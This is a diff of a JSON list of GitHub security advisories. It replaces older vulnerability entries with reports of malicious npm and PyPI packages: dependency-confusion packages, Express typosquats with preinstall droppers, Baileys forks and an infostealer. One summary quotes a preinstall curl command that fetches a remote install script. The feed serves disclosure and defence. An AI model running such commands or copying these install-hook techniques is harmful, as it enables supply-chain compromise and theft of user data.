+      "summary": "ai-workshop-maa15-radio is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, ",
       "link": ""
     },
     {
-      "id": "GHSA-x8p6-569w-fmmr",
-      "title": "[GHSA-x8p6-569w-fmmr] Duplicate Advisory: SiYuan: Cross-Site WebSocket Hijacking on the admin-only network proxy endpoint (`/ws/network/proxy`) via explicit `CheckOrigin: true` bypass",
-      "published": "2026-08-17T12:32:21Z",
-      "ecosystem": "GO",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-3cc2-h3v6-rqpq . This link is maintained to preserve external references. \n Original Description \n SiYuan versions before 3.7.4 contain a cross-site WebSocket hijacking vulnerability in the admin-only /ws/networ",
+      "id": "GHSA-9ggj-2v34-hwv8",
+      "title": "[GHSA-9ggj-2v34-hwv8] Malicious code in @bluewin/utils (npm)",
+      "published": "2026-10-02T06:31:07Z",
+      "ecosystem": "NPM",
+      "summary": "@bluewin/utils is a dependency-confusion package: it describes itself as a \"PoC package for dependency confusion testing\" and claims the  @bluewin  scope, so a build that resolves that scope from the public registry runs its code instead of the intended private package. Its postinstall script runs  ",
       "link": ""
     },
     {
-      "id": "GHSA-xcvf-46f4-xwxf",
-      "title": "[GHSA-xcvf-46f4-xwxf] Duplicate Advisory: chi Allows Host Header Injection which Leads to Open Redirect in RedirectSlashes",
-      "published": "2026-08-14T12:31:24Z",
-      "ecosystem": "GO",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-vrw8-fxc6-2r93 . This link is maintained to preserve external references. \n Original Description \n chi versions before v5.2.2 contain an open redirect vulnerability in the RedirectSlashes middleware function tha",
+      "id": "GHSA-rxfj-38w3-hw2x",
+      "title": "[GHSA-rxfj-38w3-hw2x] Malicious code in ai-workshop-radio-app (npm)",
+      "published": "2026-10-02T06:31:07Z",
+      "ecosystem": "NPM",
+      "summary": "ai-workshop-radio-app is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username, wo",
       "link": ""
     },
     {
-      "id": "GHSA-5247-m8w9-2v4m",
-      "title": "[GHSA-5247-m8w9-2v4m] Apache Airflow missing team context permits cross-team Dag actions and XCom reads",
-      "published": "2026-08-12T18:31:19Z",
+      "id": "GHSA-h4cx-hwvc-8mgj",
+      "title": "[GHSA-h4cx-hwvc-8mgj] Malicious code in live-detection-dashboard (npm)",
+      "published": "2026-10-02T06:31:07Z",
+      "ecosystem": "NPM",
+      "summary": "live-detection-dashboard is a dependency-confusion package: it takes a name that looks like an internal project, uses an inflated version (100.0.0) so it outranks private-registry versions, and runs  node setup.js || true  as a preinstall script on npm install. setup.js sends the hostname, username,",
+      "link": ""
+    },
+    {
+      "id": "GHSA-2wm2-fc38-63vw",
+      "title": "[GHSA-2wm2-fc38-63vw] Malicious code in shortneer (PyPI)",
+      "published": "2026-10-02T00:31:22Z",
       "ecosystem": "PIP",
-      "summary": "Apache Airflow's asset materialization endpoint ( POST /api/v2/assets/{asset_id}/materialize ) and the XCom result check on  wait_dag_run_until_finished  authorized the target Dag without its team, unlike every other authorization site. A team-aware auth manager distinguishes a team-scoped Dag from ",
+      "summary": "Source: kam193 (5e166ae1253c886885381cb5087f67a59a869cad6ece6f3ac40aefc6e463c27f) \n When used, the package exfiltrates Chrome extension files (likely targeting cryptocurrency wallets) and sensitive Telegram files. \n \n Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers",
       "link": ""
     },
     {
-      "id": "GHSA-f3c2-j7g8-vpp8",
-      "title": "[GHSA-f3c2-j7g8-vpp8] Apache Airflow Task SDK fails to mask list-shaped JSON Variables",
-      "published": "2026-08-12T18:31:19Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's Task SDK did not mask the contents of a Variable whose JSON value is a list, so secrets stored in that shape appeared in cleartext in task logs and in the Rendered Templates UI. Masking was applied only when the deserialized value was a string or a dict; a list at the top level matc",
+      "id": "GHSA-hg4r-6gv8-6hmj",
+      "title": "[GHSA-hg4r-6gv8-6hmj] Malicious code in online-header (npm)",
+      "published": "2026-10-01T15:30:25Z",
+      "ecosystem": "NPM",
+      "summary": "Source: ossf-package-analysis (161e267d603ad6aae77c0c365e895c8e40538da2c09f746c2183124434509fdc) \n The OpenSSF Package Analysis project identified 'online-header' @ 99.0.0 (npm) as malicious. \n It is considered malicious because: \n \n The package communicates with a domain associated with malicious a",
       "link": ""
     },
     {
-      "id": "GHSA-cjv4-7hp2-2x9h",
-      "title": "[GHSA-cjv4-7hp2-2x9h] Apache Airflow bulk endpoints log Variable and Connection secrets in cleartext",
-      "published": "2026-08-12T18:31:19Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow wrote Variable values and Connection  extra  contents to the audit log in cleartext when they were submitted through the bulk endpoints ( PATCH /api/v2/variables  and  PATCH /api/v2/connections ). The audit-log masking recognised only top-level request fields, and a bulk request nests",
+      "id": "GHSA-h3r9-cv69-cx87",
+      "title": "[GHSA-h3r9-cv69-cx87] Malicious code in saturn-baileys (npm)",
+      "published": "2026-09-30T12:35:27Z",
+      "ecosystem": "NPM",
+      "summary": "This package is part of a large family (100+ identified as of September 2026) of near-identical \nforks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into \nthe WhatsApp socket layer. On connect, the injected code issues an authenticated  w:mex  FOLLOW \nquery (qu",
       "link": ""
     },
     {
-      "id": "GHSA-q4c3-7575-55j2",
-      "title": "[GHSA-q4c3-7575-55j2] Apache Airflow scheduler unsafely deserializes human-in-the-loop task next_kwargs",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow 3.3.0 moved human-in-the-loop tasks from the triggerer to a new  awaiting_input  task state swept by the scheduler. That sweep deserializes the task instance's  next_kwargs  without an allow-list, so a Dag author — who controls that value through the task execution API — can cause an ",
+      "id": "GHSA-8h9r-v5vf-jvxr",
+      "title": "[GHSA-8h9r-v5vf-jvxr] Malicious code in shadowmd (npm)",
+      "published": "2026-09-30T12:35:27Z",
+      "ecosystem": "NPM",
+      "summary": "This package is part of a large family (100+ identified as of September 2026) of near-identical \nforks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into \nthe WhatsApp socket layer. On connect, the injected code issues an authenticated  w:mex  FOLLOW \nquery (qu",
       "link": ""
     },
     {
-      "id": "GHSA-2qjv-p2gc-mjg2",
-      "title": "[GHSA-2qjv-p2gc-mjg2] Apache Airflow Task SDK Callback deserialization can import arbitrary modules in the scheduler",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's Task SDK rebuilt a  Callback  object from serialized data by re-running its constructor, which imports the module named by the stored callback path. Because  SyncCallback  is itself an Airflow class it passes the default  allowed_deserialization_classes  allow-list, so tightening th",
+      "id": "GHSA-fpmr-r559-qrq5",
+      "title": "[GHSA-fpmr-r559-qrq5] Malicious code in @xatancchii/velycxbail (npm)",
+      "published": "2026-09-30T12:35:26Z",
+      "ecosystem": "NPM",
+      "summary": "This package is part of a large family (100+ identified as of September 2026) of near-identical \nforks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into \nthe WhatsApp socket layer. On connect, the injected code issues an authenticated  w:mex  FOLLOW \nquery (qu",
       "link": ""
     },
     {
-      "id": "GHSA-75mg-c62r-v95g",
-      "title": "[GHSA-75mg-c62r-v95g] Apache Airflow environment-variable secrets backend permits cross-team credential use",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's environment-variable secrets backend resolved a team-scoped Connection or Variable from the wrong team's scope. The guard meant to prevent this only ran when no team scope was supplied, and its pattern could not match a team name containing an underscore, which team names are allowe",
+      "id": "GHSA-p97h-939j-wpm5",
+      "title": "[GHSA-p97h-939j-wpm5] Malicious code in @bellaxchuu/crystalred (npm)",
+      "published": "2026-09-30T12:35:24Z",
+      "ecosystem": "NPM",
+      "summary": "This package is part of a large family (100+ identified as of September 2026) of near-identical \nforks of the Baileys WhatsApp Web library that inject a covert channel-subscription action into \nthe WhatsApp socket layer. On connect, the injected code issues an authenticated  w:mex  FOLLOW \nquery (qu",
       "link": ""
     },
     {
-      "id": "GHSA-j4jc-cq9h-xrhr",
-      "title": "[GHSA-j4jc-cq9h-xrhr] Apache Airflow Backfill API parser discrepancy permits cross-DAG authorization bypass",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's Backfill API authorized a request against a Dag id supplied by the caller whenever the  backfill_id  path segment failed to parse. The authorization dependency parsed it with  int()  while the route handler parsed it as pydantic's  NonNegativeInt , which accepts values  int()  rejec",
+      "id": "GHSA-9ggr-p22c-2m4m",
+      "title": "[GHSA-9ggr-p22c-2m4m] Malicious code in exptred (npm)",
+      "published": "2026-09-29T15:31:03Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (d91842ab3e5c93f5689a985b63f8de5455910d88d6815ee35f2d35d27f8a4cf7) \n npm package  exptred@5.2.1  is a typosquat of  express : package.json copies express's description ('Fast, unopinionated, minimalist web framework'), author (TJ Holowaychuk), repository (expressjs/express),",
       "link": ""
     },
     {
-      "id": "GHSA-g4qj-5vxv-wggf",
-      "title": "[GHSA-g4qj-5vxv-wggf] Apache Airflow Variables UI fails to mask sensitive values in deeply nested iterables",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's secrets masker hides values stored under sensitive key names when they are displayed in the UI. The masker's recursion-depth limit did not descend into values nested inside a list, tuple, or set beyond that limit, so an Airflow Variable holding such a deeply-nested value was shown u",
+      "id": "GHSA-v76j-vqp4-68j8",
+      "title": "[GHSA-v76j-vqp4-68j8] Malicious code in xeprews (npm)",
+      "published": "2026-09-29T15:31:03Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (17facf9b3612b1338fbda61069db829317150a9e7dbcc38cf96abbee1baa29b2) \n xeprews is an Express typosquat whose package.json declares a preinstall lifecycle hook that runs  curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js ",
       "link": ""
     },
     {
-      "id": "GHSA-c56v-8w4g-3mfm",
-      "title": "[GHSA-c56v-8w4g-3mfm] Apache Airflow Config API exposes team-scoped sensitive configuration values",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's Config API did not mask team-scoped sensitive configuration values in multi-team deployments. When an administrator has enabled multi-team mode and exposed the Config API, an authenticated Viewer holding only configuration-read access — with no prior access to the secret — could rea",
+      "id": "GHSA-49qv-wmf6-cj3h",
+      "title": "[GHSA-49qv-wmf6-cj3h] Malicious code in exptredd (npm)",
+      "published": "2026-09-29T15:31:03Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (288357063a28e85e649fc37c747c724bd06ce09c16624f7b2cad3dc854296035) \n npm package exptredd@5.2.1 impersonates the express package: package.json copies express's description, author, repository, contributors, and dependency list verbatim while shipping under the name 'exptredd",
       "link": ""
     },
     {
-      "id": "GHSA-fcmm-42r9-mmmm",
-      "title": "[GHSA-fcmm-42r9-mmmm] Apache Airflow XCom API permits unsafe deserialization through JSON string literals",
-      "published": "2026-08-12T18:31:18Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's XCom  GET /api/v2/{...}/xcomEntries/{key}?deserialize=true  endpoint passed a string-literal payload through  BaseXCom.deserialize_value  without the  _check_forbidden_xcom_keys  guard, allowing an authenticated API user with XCom write-and-read access to instantiate arbitrary  airf",
+      "id": "GHSA-4qvj-qq37-mhw2",
+      "title": "[GHSA-4qvj-qq37-mhw2] Malicious code in express-nodejs (npm)",
+      "published": "2026-09-29T15:31:02Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (9aea7dd76028cd443cf2f8d58fa5d8b3b28bb6db870f34d1cc6dad28db92fe93) \n express-nodejs@5.2.1 typosquats the express framework: package.json copies express's description, author (TJ Holowaychuk), repository (expressjs/express), and homepage while publishing under a different nam",
       "link": ""
     },
     {
-      "id": "GHSA-f643-3rc2-j27w",
-      "title": "[GHSA-f643-3rc2-j27w] Apache Airflow exposes dict-valued var.json secrets in Rendered Templates",
-      "published": "2026-08-12T18:31:17Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's secrets masker did not mask  var.json  Variable values whose value is a dict in the Rendered Templates UI — the dict value failed an  isinstance(str)  guard — so a secret stored as a JSON Variable and referenced in a template via  var.json  was displayed in cleartext to any user wit",
+      "id": "GHSA-pf56-8g6j-whr9",
+      "title": "[GHSA-pf56-8g6j-whr9] Malicious code in exprrdd (npm)",
+      "published": "2026-09-29T15:31:02Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (bc1c956097cd13e80298a796a5026ebd91ece7c2ad53d226d3729f0b0b0ee9f3) \n Package 'exprrdd' copies express's metadata (name-lookalike, description, author, contributors, repository, keywords, dependencies) as cover for a preinstall dropper. package.json line 98 declares a preinst",
       "link": ""
     },
     {
-      "id": "GHSA-8prw-8m6x-8w6f",
-      "title": "[GHSA-8prw-8m6x-8w6f] Apache Airflow exception-node deserialization permits arbitrary callable execution",
-      "published": "2026-08-12T18:31:17Z",
-      "ecosystem": "PIP",
-      "summary": "Apache Airflow's serialization layer reconstructed exception nodes by calling  import_string()  on a class name taken from the serialized blob and instantiating it with arguments from the same blob, with no restriction on what could be imported. An operator's  executor_config  reaches that branch, s",
+      "id": "GHSA-w7pc-jg8g-2xr4",
+      "title": "[GHSA-w7pc-jg8g-2xr4] Malicious code in exprdd (npm)",
+      "published": "2026-09-29T15:31:01Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (4cd27ec488e87cd2e26c940ac161033475731708a3f2ae629c4a138275b520f9) \n exprdd@5.2.1 impersonates the express framework — package name, description, author, contributors, repository, homepage, and keywords are copied verbatim from express. package.json declares a preinstall lif",
       "link": ""
     },
     {
-      "id": "GHSA-qmrf-jrpr-rjx6",
-      "title": "[GHSA-qmrf-jrpr-rjx6] Apache Airflow Yandex Lockbox backend allows cross-team secret disclosure",
-      "published": "2026-08-10T21:32:02Z",
-      "ecosystem": "PIP",
-      "summary": "The Yandex Lockbox secrets backend in Apache Airflow's Yandex provider resolved a team-scoped Connection or Variable id through the team-agnostic lookup when the team-scoped lookup missed. In a deployment running multi-team mode with this backend, a caller in one team could resolve a secret belongin",
+      "id": "GHSA-2m2v-6g9c-m674",
+      "title": "[GHSA-2m2v-6g9c-m674] Malicious code in express-javascript (npm)",
+      "published": "2026-09-29T15:31:01Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (73e4909976d37fb7fb7dd30012d82bd882608df20716a824f1dc0efa074b5401) \n express-javascript@5.2.1 impersonates the express package (copying its description, author, contributors, repository, homepage, and dependency list verbatim) while its package.json preinstall lifecycle hook",
       "link": ""
     },
     {
-      "id": "GHSA-2jhm-w3mp-jcwr",
-      "title": "[GHSA-2jhm-w3mp-jcwr] NLTK network URL validation permits SSRF to RFC 6598 shared-address-space hosts",
-      "published": "2026-08-10T00:31:42Z",
-      "ecosystem": "PIP",
-      "summary": "A Server-Side Request Forgery (SSRF) vulnerability exists in nltk/nltk versions 3.9.4 and the current develop branch. The  nltk.pathsec.validate_network_url()  function, intended to prevent SSRF by rejecting internal network addresses, fails to reject IPs in the RFC 6598 shared address space ( 100.6",
+      "id": "GHSA-2wmg-qp72-3736",
+      "title": "[GHSA-2wmg-qp72-3736] Malicious code in hardhat-devkit (npm)",
+      "published": "2026-09-21T18:31:37Z",
+      "ecosystem": "NPM",
+      "summary": "Source: amazon-inspector (ddcb676af47bf26017d1fbc2cf63aae76d09e9248e860f6d0e86d57da92d2b95) \n Package published as  hardhat-devkit  presents itself as an Ethereum/Hardhat developer toolkit, but the shipped surface is a cover story: README, index.d.ts, and keywords ( fast ,  logger ,  stream ,  json ",
       "link": ""
     },
     {
-      "id": "GHSA-ffj6-66c4-86gw",
-      "title": "[GHSA-ffj6-66c4-86gw] NLTK downloader allows cross-package resource and model poisoning",
-      "published": "2026-08-07T09:31:52Z",
-      "ecosystem": "PIP",
-      "summary": "A vulnerability in  nltk.downloader  in nltk/nltk versions &lt;= 3.9.4 allows for cross-package resource and model poisoning. The downloader extracts package archives into shared namespaces such as  corpora/  and  taggers/  instead of package-isolated roots, and validates package integrity only afte",
+      "id": "GHSA-3763-qp59-59vf",
+      "title": "[GHSA-3763-qp59-59vf] nimiq-blockchain: Validity store off by one error",
+      "published": "2026-08-12T15:16:53Z",
+      "ecosystem": "RUST",
+      "summary": "Impact \n The validity store treats a transaction with stored  block_number = X  as \"in window\" only when  X &gt; last_bn - transaction_validity_window_blocks  (strict inequality). However the protocol's  Transaction::is_valid_at  accepts a transaction for inclusion in any block in  [validity_start_h",
       "link": ""
     },
     {
@@ -637,171 +797,11 @@
       "link": ""
     },
     {
-      "id": "GHSA-w72q-x6w3-7rj3",
-      "title": "[GHSA-w72q-x6w3-7rj3] Duplicate Advisory: @a2ui/web_core: `openUrl` permits `javascript:` URI execution via agent-supplied button actions",
-      "published": "2026-08-04T18:31:26Z",
-      "ecosystem": "NPM",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-72qq-p3r5-f7wq . This link is maintained to preserve external references. \n Original Description \n The openUrl function in @a2ui/web_core passes an agent-controlled URL directly to window.open() without validati",
-      "link": ""
-    },
-    {
-      "id": "GHSA-642r-3gj9-2pj5",
-      "title": "[GHSA-642r-3gj9-2pj5] Duplicate Advisory: jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
-      "published": "2026-08-04T15:32:24Z",
-      "ecosystem": "MAVEN",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-r7wm-3cxj-wff9 . This link is maintained to preserve external references. \n Original Description \n The fix released in jackson-core 2.18.6 and 2.21.1 for  CVE-2026-18401  ( GHSA-72hv-8253-57qq , number length co",
-      "link": ""
-    },
-    {
-      "id": "GHSA-4h8q-hh2j-755w",
-      "title": "[GHSA-4h8q-hh2j-755w] BlenderMCP path traversal in download_polyhaven_asset allows arbitrary file writes",
-      "published": "2026-07-24T15:33:04Z",
-      "ecosystem": "PIP",
-      "summary": "BlenderMCP before commit 30a3308 contains a path traversal vulnerability in the download_polyhaven_asset method that allows attackers to write arbitrary files by injecting traversal sequences in API response include keys. Attackers performing MITM attacks or prompt injection can supply malicious pat",
-      "link": ""
-    },
-    {
-      "id": "GHSA-379c-qx7v-6h59",
-      "title": "[GHSA-379c-qx7v-6h59] Hugging Face Datasets folder-based builders allow path traversal through file_name metadata",
-      "published": "2026-07-24T15:33:03Z",
-      "ecosystem": "PIP",
-      "summary": "Datasets through 5.0.0, fixed in f989ef9, contains a path traversal vulnerability in folder-based dataset builders where the file_name metadata field is not properly validated before being joined to the dataset directory. Attackers can supply crafted file_name values with directory traversal sequenc",
-      "link": ""
-    },
-    {
-      "id": "GHSA-jxrp-r7gx-q4j8",
-      "title": "[GHSA-jxrp-r7gx-q4j8] Duplicate Advisory: DOMPurify: `CUSTOM_ELEMENT_HANDLING` bypasses `afterSanitizeElements` for allowed custom elements.",
-      "published": "2026-07-24T15:33:01Z",
-      "ecosystem": "NPM",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-c2j3-45gr-mqc4 . This link is maintained to preserve external references. \n Original Description \n DOMPurify before 3.4.12 fails to execute afterSanitizeElements hook for custom elements allowed via CUSTOM_ELEME",
-      "link": ""
-    },
-    {
-      "id": "GHSA-r7wm-3cxj-wff9",
-      "title": "[GHSA-r7wm-3cxj-wff9] jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
-      "published": "2026-07-21T21:58:53Z",
-      "ecosystem": "MAVEN",
-      "summary": "Summary \n The fix released in jackson-core  2.18.6  and  2.21.1  for  GHSA-72hv-8253-57qq  (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit  b0c428e6  (#1555) wired  validateIntegerLength  into a new  _setIntLength  helper and called it at every p",
-      "link": ""
-    },
-    {
       "id": "GHSA-x77v-q46j-393g",
       "title": "[GHSA-x77v-q46j-393g] Gitea: Blind SSRF in OAuth2 avatar synchronization via unvalidated OIDC picture claim",
       "published": "2026-07-21T20:22:23Z",
       "ecosystem": "GO",
       "summary": "Summary \n When  [oauth2_client] UPDATE_AVATAR = true  is enabled, Gitea fetches the avatar URL received from an OAuth2/OIDC provider using Go's default HTTP client. The URL comes from the user's OAuth/OIDC avatar value, commonly the OIDC  picture  claim. \n The affected code path calls  http.Get(url)",
-      "link": ""
-    },
-    {
-      "id": "GHSA-c2j3-45gr-mqc4",
-      "title": "[GHSA-c2j3-45gr-mqc4] DOMPurify: `CUSTOM_ELEMENT_HANDLING` bypasses `afterSanitizeElements` for allowed custom elements.",
-      "published": "2026-07-21T19:41:07Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n There is a possible hook-policy inconsistency in DOMPurify 3.4.11 involving  CUSTOM_ELEMENT_HANDLING . \n When a custom element is allowed via  CUSTOM_ELEMENT_HANDLING.tagNameCheck , it appears that the element does not go through  afterSanitizeElements  in the same way as a normal element.",
-      "link": ""
-    },
-    {
-      "id": "GHSA-8j86-h8gg-797p",
-      "title": "[GHSA-8j86-h8gg-797p] GPT Researcher MCP STDIO configuration allows remote command execution",
-      "published": "2026-07-16T00:31:33Z",
-      "ecosystem": "PIP",
-      "summary": "An issue in Open Source GPT Researcher v3.3.7 allows attackers to execute arbitrary commands on a victim system via user interaction with a crafted HTML page. \n            Affected Packages  \n\n   \n       gpt-researcher \n       Ecosystem: pip \n       Severity: critical \n       Versions: &gt;= 0.14.5,",
-      "link": ""
-    },
-    {
-      "id": "GHSA-3wcj-gjvf-fvch",
-      "title": "[GHSA-3wcj-gjvf-fvch] Duplicate Advisory: Hono vulnerable to Prototype Pollution possible through __proto__ key allowed in parseBody({ dot: true })",
-      "published": "2026-07-11T15:30:23Z",
-      "ecosystem": "NPM",
-      "summary": "Duplicate Advisory \n This advisory has been withdrawn because it is a duplicate of  GHSA-v8w9-8mx6-g223 . This link is maintained to preserve external references. \n Original Description \n Hono before 4.12.7 allows  proto  key in parseBody with dot option enabled, permitting specially crafted form fi",
-      "link": ""
-    },
-    {
-      "id": "GHSA-8c5q-hx4g-qq23",
-      "title": "[GHSA-8c5q-hx4g-qq23]  LocalAI POST /models/apply permits unauthenticated server-side request forgery through gallery URLs",
-      "published": "2026-07-07T21:31:36Z",
-      "ecosystem": "GO",
-      "summary": "LocalAI contains an unauthenticated server-side request forgery vulnerability in the POST /models/apply endpoint that allows attackers to fetch arbitrary internal URLs. The endpoint passes unsanitized gallery URL fields directly to gallery.GetGalleryConfigFromURLWithContext without proper validation",
-      "link": ""
-    },
-    {
-      "id": "GHSA-xw5h-cmh3-8j6j",
-      "title": "[GHSA-xw5h-cmh3-8j6j] Apache CXF has Improper Restriction of XML External Entity Reference",
-      "published": "2026-06-12T12:31:33Z",
-      "ecosystem": "MAVEN",
-      "summary": "Apache CXF's EndpointReferenceUtils and W3CMultiSchemaFactory classes construct a SAXParserFactory without the necessary JAXP hardening configurations, enabling out-of-band (OOB) \nexternal entity resolution. Users are recommended to upgrade to versions 4.2.2 or 4.1.7, which fix this issue. \n        ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-4v8g-86x5-3vrc",
-      "title": "[GHSA-4v8g-86x5-3vrc] Apache OpenNLP DictionaryEntryPersistor Vulnerable to XML External Entity (XXE) via Unsanitized Dictionary Parsing",
-      "published": "2026-05-04T18:30:30Z",
-      "ecosystem": "MAVEN",
-      "summary": "XML External Entity (XXE) via Unsanitized Dictionary Parsing in Apache OpenNLP DictionaryEntryPersistor \n Versions Affected: before 2.5.9, before 3.0.0-M3 \n Description: The DictionaryEntryPersistor class initializes a static SAXParserFactory at class-load time without enabling FEATURE_SECURE_PROCES",
-      "link": ""
-    },
-    {
-      "id": "GHSA-4p9m-8gc4-rw2h",
-      "title": "[GHSA-4p9m-8gc4-rw2h] GoBGP vulnerable to a denial of service via the NEXT_HOP path attribute",
-      "published": "2026-03-16T18:32:03Z",
-      "ecosystem": "GO",
-      "summary": "An issue in GoBGP gobgpd v.4.2.0 allows a remote attacker to cause a denial of service via the NEXT_HOP path attribute. \n            Affected Packages  \n\n   \n       github.com/osrg/gobgp/v4 \n       Ecosystem: go \n       Severity: high \n       Versions: &lt;= 4.3.0 \n         Fixed in: 4.4.0 \n   \n\n   ",
-      "link": ""
-    },
-    {
-      "id": "GHSA-v8w9-8mx6-g223",
-      "title": "[GHSA-v8w9-8mx6-g223] Hono vulnerable to Prototype Pollution possible through __proto__ key allowed in parseBody({ dot: true })",
-      "published": "2026-03-11T00:31:47Z",
-      "ecosystem": "NPM",
-      "summary": "Summary \n When using  parseBody({ dot: true })  in HonoRequest, specially crafted form field names such as  __proto__.x  could create objects containing a  __proto__  property. \n If the parsed result is later merged into regular JavaScript objects using unsafe merge patterns, this may lead to protot",
-      "link": ""
-    },
-    {
-      "id": "GHSA-5r2p-pjr8-7fh7",
-      "title": "[GHSA-5r2p-pjr8-7fh7] SageMaker Python SDK replaced eval() with safe parser in JumpStart search functionality",
-      "published": "2026-03-05T22:01:09Z",
-      "ecosystem": "PIP",
-      "summary": "Summary \n This advisory addresses the use of the search_hub() function within the SageMaker Python SDK's JumpStart search functionality. An actor with the ability to control query parameters passed to the search_hub() function could potentially provide malformed input that causes the eval() function",
-      "link": ""
-    },
-    {
-      "id": "GHSA-2p5w-cvg5-gc5c",
-      "title": "[GHSA-2p5w-cvg5-gc5c] Hibernate vulnerable to SQL Injection",
-      "published": "2026-01-23T09:30:28Z",
-      "ecosystem": "MAVEN",
-      "summary": "A flaw was found in Hibernate. A remote attacker with low privileges could exploit a second-order SQL injection vulnerability by providing specially crafted, unsanitized non-alphanumeric characters in the ID column when the InlineIdsOrClauseBuilder is used. This could lead to sensitive information d",
-      "link": ""
-    },
-    {
-      "id": "GHSA-vrw8-fxc6-2r93",
-      "title": "[GHSA-vrw8-fxc6-2r93] chi Allows Host Header Injection which Leads to Open Redirect in RedirectSlashes",
-      "published": "2025-06-20T16:37:47Z",
-      "ecosystem": "GO",
-      "summary": "Summary \n The RedirectSlashes function in middleware/strip.go is vulnerable to host header injection which leads to open redirect. \n We consider this a  lower-severity  open redirect, as it can't be exploited from browsers or email clients (requires manipulation of a Host header). \n Details \n The Re",
-      "link": ""
-    },
-    {
-      "id": "GHSA-6mcc-q3mg-3qg6",
-      "title": "[GHSA-6mcc-q3mg-3qg6] LlamaIndex DuckDBVectorStore vulnerable to SQL injection through ref_doc_id",
-      "published": "2025-06-02T12:30:33Z",
-      "ecosystem": "PIP",
-      "summary": "An SQL injection vulnerability exists in the delete function of DuckDBVectorStore in run-llama/llama_index version v0.12.19. This vulnerability allows an attacker to manipulate the ref_doc_id parameter, enabling them to read and write arbitrary files on the server, potentially leading to remote code",
-      "link": ""
-    },
-    {
-      "id": "GHSA-fccv-jmmp-qg76",
-      "title": "[GHSA-fccv-jmmp-qg76] Apache Tomcat Improper Input Validation vulnerability",
-      "published": "2023-11-28T18:30:23Z",
-      "ecosystem": "MAVEN",
-      "summary": "Improper Input Validation vulnerability in Apache Tomcat. Tomcat from 11.0.0-M1 through 11.0.0-M10, from 10.1.0-M1 through 10.1.15, from 9.0.0-M1 through 9.0.82, and from 8.5.0 through 8.5.95 did not correctly parse HTTP trailer headers. A trailer header that exceeded the header size limit could cau",
-      "link": ""
-    },
-    {
-      "id": "GHSA-7rjr-3q55-vv33",
-      "title": "[GHSA-7rjr-3q55-vv33] Incomplete fix for Apache Log4j vulnerability",
-      "published": "2021-12-14T18:01:28Z",
-      "ecosystem": "MAVEN",
-      "summary": "Impact \n The fix to address  CVE-2021-44228  in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (fo",
       "link": ""
     }
   ]
